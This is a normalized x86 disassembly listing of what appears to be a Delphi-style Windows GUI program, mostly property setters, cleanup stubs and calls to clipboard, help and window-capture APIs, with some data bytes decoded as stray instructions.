mov eax edx
retn
mov eax ecx
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx eax
sub_42a349
jmp sub_4038ec
sub_42a350
pop ebx
mov esp ebp
pop ebp
retn
sub_42a45c
cmp dl [ eax + 0x179 ]
je r-xdata
retn
mov [ eax + 0x179 ] dl
mov edx eax
call sub_42a4cc
sub_42a474
push esi
mov esi eax
mov eax [ esi + 0x168 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_42a484
cmp dl [ eax + 0x178 ]
je r-xdata
retn
mov [ eax + 0x178 ] dl
mov edx eax
call sub_42a4cc
sub_42a49c
cmp dl [ eax + 0x17b ]
je r-xdata
retn
mov [ eax + 0x17b ] dl
mov edx eax
call sub_42a4cc
sub_42a4b4
cmp dl [ eax + 0x17d ]
je r-xdata
retn
mov [ eax + 0x17d ] dl
mov edx eax
call sub_42a4cc
sub_42a71e
jmp sub_403638
sub_42a7d7
jmp sub_4038ec
sub_42a7de
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42a7e4
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_42a758
sub_42a7f4
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_42a758
sub_42a804
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_42a758
pop ebp
retn 0x8
sub_42a81c
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_42a948
push ebx
mov ebx eax
mov eax ebx
call sub_440330
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42a95c
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42a990
cmp [ eax + 0x21e ] 0x0
jne r-xdata
retn
mov [ edx + 0xc ] 0x1
sub_42aa94
jmp sub_4038ec
sub_42aa9b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ac3e
jmp sub_4038ec
sub_42ac45
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ac4f
inc [ ecx ]
add [ eax ] al
add [ edi ] dl
add [ eax ] al
mov [ eax + 0x220 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42ac64
push ebx
mov ebx eax
mov [ ebx + 0x211 ] dl
mov eax ebx
call sub_43d618
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42ac9c
push ebx
mov ebx eax
mov [ ebx + 0x214 ] edx
mov eax ebx
call sub_43d618
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42acb8
push ebx
mov ebx eax
mov [ ebx + 0x218 ] edx
mov eax ebx
call sub_43d618
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42acd4
cmp dl [ eax + 0x21c ]
je r-xdata
retn
mov [ eax + 0x21c ] dl
call sub_43e2f8
sub_42ace8
mov al [ eax + 0x220 ]
retn
sub_42ae51
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
sub_42ae69
jmp sub_4038ec
sub_42b175
jmp sub_403638
sub_42b2e8
retn
sub_42b475
jmp sub_4038ec
sub_42b4f8
push ebx
mov ebx eax
mov eax ebx
call sub_43c62c
mov eax ebx
call sub_42b2ec
pop ebx
retn
sub_42b50c
push ebx
mov ebx eax
mov [ ebx + 0x220 ] 0x1
mov eax ebx
call sub_43cd4c
mov [ ebx + 0x220 ] 0x0
mov eax ebx
call sub_42b634
pop ebx
retn
sub_42b624
push esi
mov esi eax
mov eax [ esi + 0x214 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_42b6fd
jmp sub_4038ec
sub_42b704
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42b74c
push ebx
mov ebx eax
mov eax ebx
call sub_4402b4
mov eax ebx
call sub_42b2ec
pop ebx
retn
sub_42b760
push ebx
mov ebx eax
mov eax ebx
call sub_432f20
mov eax ebx
call sub_42b2ec
pop ebx
retn
sub_42b774
mov al 0x1
retn
sub_42b778
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_42bab0
jmp sub_4038ec
sub_42bab7
pop ebp
retn
sub_42babc
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403c70
mov eax [ r-xdata ]
call sub_413884
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4138d0
sub_42bb11
jmp sub_4038ec
sub_42bb18
pop ebp
retn
sub_42bb1c
sub [ rw-data ] 0x1
retn
sub_42bb55
jmp sub_4038ec
sub_42bb5c
pop ebp
retn
sub_42bb60
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_42bbdc
retn
sub_42bbdd
jmp sub_4038ec
j_sub_42bbdc
jmp sub_42bbdc
sub_42bbe4
pop ebp
retn
sub_42bbe8
sub [ rw-data ] 0x1
retn
sub_42bc9d
xor eax [ eax ]
hlt
sub_42be44
jmp r-xdata
call [ eax - 0x4fffbd22 ]
fiadd [ edx ]
in al 0xde
inc edx
add [ edi + ebx * 8 + 0x42 ] dl
add ah ch
fild [ edx ]
hlt
sub_42c38d
xor eax [ eax ]
hlt
sub_42c3e5
xor eax [ eax ]
hlt
sub_42c630
mov eax [ eax + 0x4 ]
cmp [ eax + 0x8 ] 0x0
sete al
retn
sub_42cdb3
jmp sub_4038ec
sub_42cdef
jmp sub_4038ec
sub_42d9fa
jmp sub_4038ec
sub_42da01
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42dc88
call sub_43baac
retn
sub_42dc90
push ebx
mov ebx eax
mov eax ebx
call sub_42dcac
mov edx [ eax ]
call [ edx + 0x24 ]
pop ebx
retn
sub_42dca4
mov eax [ r-xdata ]
retn
sub_42dcac
mov eax [ eax + 0x16c ]
mov eax [ eax + 0x4 ]
retn
sub_42dcb8
push esi
mov esi eax
mov eax [ esi + 0x16c ]
call sub_42c7a0
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
retn
sub_42dcd0
mov eax [ eax + 0x16c ]
mov al [ eax + 0x20 ]
retn
sub_42dd08
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42ddb8
push esi
mov esi eax
cmp dl [ esi + 0x180 ]
je r-xdata
pop esi
retn
mov [ esi + 0x180 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42ddd4
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
call sub_42dd10
sub_42dde8
push esi
mov esi eax
cmp dl [ esi + 0x173 ]
je r-xdata
pop esi
retn
mov [ esi + 0x173 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42de04
push esi
mov esi eax
cmp edx [ esi + 0x17c ]
je r-xdata
pop esi
retn
cmp edx 0xffffffff
jl r-xdata
mov [ esi + 0x17c ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42de24
push esi
mov esi eax
cmp edx [ esi + 0x174 ]
je r-xdata
pop esi
retn
mov [ esi + 0x174 ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42de7c
cmp dl [ eax + 0x172 ]
je r-xdata
retn
mov [ eax + 0x172 ] dl
call sub_42dd10
sub_42de90
push esi
mov esi eax
mov eax esi
call sub_43bc5c
cmp [ esi + 0x170 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov si 0xffe9
call sub_403394
sub_42dfdd
jmp sub_4038ec
sub_42dfe4
pop edi
pop esi
pop ecx
pop ebp
retn
sub_42dfec
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42dff4
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42dffc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x16c ]
mov eax esi
call sub_42c72c
mov dl [ ebx + 0x182 ]
mov eax esi
call sub_42c840
pop esi
pop ebx
retn
sub_42e22c
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_403198
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_42e28e
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 4 - 0x3e0bffb9 ] dl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x780047b9 ] dl
retn 0x47
sub_42e2f0
jmp sub_4038ec
sub_42e2f7
pop ebp
retn
sub_42e2fc
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_42e248
call sub_403cbc
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402b98
sub_42e5e3
jmp sub_403638
sub_42e61b
jmp sub_4038ec
sub_42e622
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42e8e1
jmp sub_4038ec
sub_42e990
push ebx
mov ebx eax
mov eax ebx
call sub_4043a8
push eax
call GetFileAttributesA
cmp eax 0xffffffff
setne al
pop ebx
retn
sub_42eae4
jmp sub_403638
sub_42eb80
jmp sub_4038ec
sub_42eb87
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42eb90
call sub_4279e8
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45b094
retn
sub_42ec7c
jmp sub_4038ec
sub_42ec83
pop ebx
mov esp ebp
pop ebp
retn
sub_42ec88
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
xor edx edx
mov [ eax + 0x44 ] edx
test [ eax + 0x5e ] 0x1
jne r-xdata
mov edx r-xdata
mov [ eax + 0x44 ] edx
jmp r-xdata
call sub_42839c
retn
sub_42ef06
jmp sub_4038ec
sub_42ef0d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ef2a
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
sub_42ef23
jmp sub_4038ec
sub_42ef2a
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42ef66
add [ eax ] al
cmp [ ecx ] 0x1b
jne r-xdata
retn
mov eax edx
call sub_456d1c
sub_42efc3
jmp sub_4038ec
sub_42efca
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_42eff5
jmp sub_4038ec
sub_42effc
pop ebp
retn
sub_42f000
sub [ rw-data ] 0x1
retn
sub_42f05c
jmp sub_4038ec
sub_42f063
pop ebp
retn
sub_42f068
sub [ rw-data ] 0x1
retn
sub_42f0c4
jmp sub_4038ec
sub_42f0cb
pop ebp
retn
sub_42f0d0
sub [ rw-data ] 0x1
retn
sub_42f131
jmp sub_4038ec
sub_42f138
pop ebp
retn
sub_42f13c
sub [ rw-data ] 0x1
retn
sub_42f188
jmp sub_4038ec
sub_42f18f
pop ebp
retn
sub_42f194
sub [ rw-data ] 0x1
retn
sub_42f1c1
jmp sub_4038ec
sub_42f1c8
pop ebp
retn
sub_42f1cc
sub [ rw-data ] 0x1
retn
sub_42f209
xor eax [ eax ]
hlt
sub_42f274
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40c218
mov [ rw-data ] eax
sub_42f2a9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_42f2c0
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_42f343
jmp sub_4038ec
sub_42f34a
pop ebp
retn
sub_42f34c
sub [ rw-data ] 0x1
retn
sub_42f389
xor eax [ eax ]
hlt
sub_42f65c
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_42f674
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_42f6b8
push ebx
mov ebx eax
mov eax ebx
call sub_42ff14
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_42ff03
jmp sub_4038ec
sub_42ff14
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_426cec
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_42f688
sub_42ff6b
jmp sub_4038ec
sub_42ff72
pop ebp
retn
sub_42ff74
sub [ rw-data ] 0x1
retn
sub_43053c
jmp [ eax ]
sub_43270c
jmp [ eax ]
sub_432a9b
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx - 0x4ec9172d ]
add [ eax ] al
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_432e56
jmp sub_4038ec
sub_432e5d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_432ee2
jmp sub_4038ec
sub_432ee9
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_432ef0
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_43d618
pop ebx
retn
sub_432f04
push ebx
mov ebx eax
mov eax ebx
call sub_440370
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_43d618
pop ebx
retn
sub_432f20
push ebx
mov ebx eax
mov eax ebx
call sub_43f344
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_432fcc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a570
pop esi
pop ebx
retn
sub_433136
jmp sub_4038ec
sub_43313d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43324c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_43c62c
mov eax ebx
mov si 0xffc7
call sub_403394
pop esi
pop ebx
retn
sub_433338
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_433354
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_403394
sub_433370
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_43337c
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_419b20
sub_433390
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4333f0
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_433464
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_403394
pop esi
pop ebx
retn
sub_433480
push esi
mov esi eax
mov eax esi
call sub_43c138
mov eax esi
mov si 0xffc7
call sub_403394
pop esi
retn
sub_433525
jmp sub_4038ec
sub_43352c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_433534
push ebx
mov ebx eax
mov eax ebx
call sub_43c29c
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_433558
push ebx
mov ebx eax
mov eax ebx
call sub_43c2b4
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_43362e
jmp sub_4038ec
sub_4336d8
mov eax [ r-xdata ]
retn
sub_4336e0
xor eax eax
retn
sub_433704
retn
sub_43381c
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_43e2f8
sub_433894
push ebx
mov ebx eax
mov eax ebx
call sub_451710
test eax eax
je r-xdata
mov eax ebx
call sub_43baac
pop ebx
retn
mov edx [ ebx + 0x214 ]
mov [ eax + 0x24c ] edx
sub_4338b8
xor eax eax
retn
sub_43397f
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x5c79173d ]
add [ eax ] al
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
pop ebx
retn
sub_433998
push esi
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov si 0xffeb
call sub_403394
sub_433a89
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_433a92
jmp sub_4038ec
j_sub_433a89
jmp sub_433a89
sub_433a99
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_433c44
push ebx
mov ebx eax
mov eax ebx
call sub_43a17c
mov eax ebx
call sub_43baac
pop ebx
retn
sub_433c58
cmp [ eax + 0x212 ] 0x1
sete al
retn
sub_433c64
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_43e2f8
sub_433c78
test dl dl
je r-xdata
xor edx edx
call sub_433c8c
retn
mov dl 0x1
call sub_433c8c
retn
sub_433d68
push ebx
mov ebx eax
mov eax ebx
call sub_43f344
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_433d7c
call sub_43e2f8
retn
sub_433e12
jmp sub_4038ec
sub_433e19
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_433e20
cmp [ edx + 0x6 ] 0x0
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0xd0 ]
sub_433e90
mov al [ eax + 0x211 ]
retn
sub_433ec4
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_43e2f8
sub_4340a4
call sub_43e2f8
retn
sub_434121
jmp sub_4038ec
sub_434128
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434185
jmp sub_4038ec
sub_43418c
pop ebp
retn
sub_434190
sub [ rw-data ] 0x1
retn
sub_4342ed
jmp sub_4038ec
sub_4342f4
pop ebp
retn
sub_4342f8
sub [ rw-data ] 0x1
retn
sub_434300
salc
inc edi
add ch dh
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp sub_434b78
sub_434311
add eax 0xffffffe0
jmp sub_4348f8
sub_434319
add eax 0xffffffe0
jmp sub_434960
sub_434321
add eax 0xffffffe0
jmp sub_434a74
sub_434329
add eax 0xffffffe0
jmp sub_434ae8
sub_434331
add eax 0xffffffe0
jmp sub_4345a4
sub_434339
add eax 0xffffffe0
jmp sub_4345b8
sub_434341
add eax 0xffffffe0
jmp sub_434630
sub_434349
add eax 0xffffffe0
jmp sub_4346d4
sub_434351
add eax 0xffffffe0
jmp sub_4346d8
sub_434359
add eax 0xffffffe0
jmp sub_434760
sub_434361
add eax 0xffffffe0
jmp sub_4348a8
sub_434369
add eax 0xffffffe0
jmp sub_4348ac
sub_434371
add eax 0xffffffe0
jmp sub_4348c8
sub_434383
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405708
sub_43438d
add [ esp + 0x4 ] 0xffffffe0
jmp sub_40571c
sub_434561
jmp sub_4038ec
sub_434568
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4345a4
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_403f3c
pop ebx
retn
sub_43461f
jmp sub_4038ec
sub_434626
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4346b8
jmp sub_4038ec
sub_4346bf
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4346d4
mov al 0x1
retn
sub_434753
jmp sub_4038ec
sub_43475a
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_434858
jmp sub_4038ec
sub_43485f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4348a8
mov [ eax + 0xc ] edx
retn
sub_4348ac
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_434950
jmp sub_4038ec
sub_434957
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434a56
jmp sub_4038ec
sub_434a5d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_434ad6
jmp sub_4038ec
sub_434add
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_434b68
jmp sub_4038ec
sub_434b6f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434c63
jmp sub_4038ec
sub_434c6a
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_434d2c
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_434c78
call EnumWindows
retn
sub_434dbe
jmp sub_4038ec
sub_434dc5
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_434dd0
xor eax eax
retn
sub_434ec9
jmp sub_4038ec
sub_434ed0
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434fba
jmp sub_4038ec
sub_434fc1
pop ebp
retn
sub_435016
jmp sub_4038ec
sub_43501d
pop ebp
retn
sub_4354c9
xor eax [ eax ]
hlt
sub_4361a0
jmp r-xdata
sub_4361a2
0xe8ffe9ff 0xe7ff
sub_4361a9
jmp esi
sub_436246
mov esp 0x940043c8
retn 0x43
sub_43624e
pushfd
retn 0x43
sub_436252
mov ah 0xc2
inc ebx
add ah cl
retn 0x43
sub_4364a9
xor eax [ eax ]
hlt
sub_4365d8
push 0x105
add bh bh
sub_43710d
xor eax [ eax ]
hlt
sub_4372dd
xor eax [ eax ]
hlt
sub_4372fc
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_43760f
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_413af8
retn
sub_43762c
push 0x15
mov ecx rw-data
call sub_413ab8
retn
sub_437718
call GetCapture
call sub_4373fc
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_4377b9
xor eax [ eax ]
hlt
sub_43797c
push ebx
push eax
push sub_437b00
call sub_41ab9c
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_437994
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_4379c4
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_41ac50
pop ebx
retn
sub_437aa2
jmp sub_403638
sub_437ad4
xor eax eax
retn
sub_437ad8
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_437af0
retn
sub_437af4
mov eax [ rw-data ]
retn
sub_437afc
retn
sub_437b2a
jmp sub_403638
sub_437b2f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45a544
call sub_4039a0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_437b4c
call sub_4033f0
xor eax eax
mov [ rw-data ] eax
retn
sub_437b5c
call sub_4033ec
xor eax eax
mov [ rw-data ] eax
retn
sub_437b6c
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_437c1c
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_437c34
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_437c80
retn
sub_437e38
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_403394
pop esi
retn
sub_437e4c
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_403394
pop esi
retn
sub_437e60
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_437e6c
mov eax 0x4
retn
sub_437e74
retn
sub_438a65
jmp sub_403638
sub_438d52
jmp sub_4038ec
sub_438dc4
jmp sub_4038ec
sub_438dd0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_438af8
sub_438f4f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_41dc58
retn
sub_438f65
jmp sub_4038ec
sub_438f8c
jmp sub_4038ec
sub_43900e
jmp sub_4038ec
sub_439036
jmp sub_4038ec
sub_43903d
mov esp ebp
pop ebp
retn
sub_4390f5
jmp sub_4038ec
sub_43914c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_439118
mov [ ebx + 0x58 ] esi
sub_4392a0
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_4392b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403348
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_43939d
jmp sub_4038ec
sub_4393a4
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439427
jmp sub_4038ec
sub_43942e
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_4397fc
xor eax eax
retn
sub_439800
mov al [ eax + 0x58 ]
retn
sub_439804
xor eax eax
retn
sub_439808
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_439810
mov eax [ eax + 0x30 ]
retn
sub_4398b4
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_439960
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_439978
mov [ eax + 0x5d ] dl
retn
sub_43997c
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_43d55c
sub_43998c
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_439e6f
jmp sub_4038ec
sub_439e76
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439ed8
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_439f5c
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_43a079
jmp sub_4038ec
sub_43a080
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43a17c
push eax
xor ecx ecx
mov edx 0xb037
call sub_43b724
retn
sub_43a33d
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_403394
sub_43a3ee
jmp sub_4038ec
sub_43a3f5
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43a4cc
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_43b724
sub_43a4e4
push 0x0
xor ecx ecx
mov edx 0xe
call sub_43b724
retn
sub_43a4f4
push edx
mov edx 0xd
call sub_43b724
retn
sub_43a500
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_43a514
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_43a5f5
jmp sub_4038ec
sub_43a5fc
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43a604
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_43b724
sub_43a674
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_43a688
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_43a694
mov al [ eax + 0x60 ]
xor al 0x1
retn
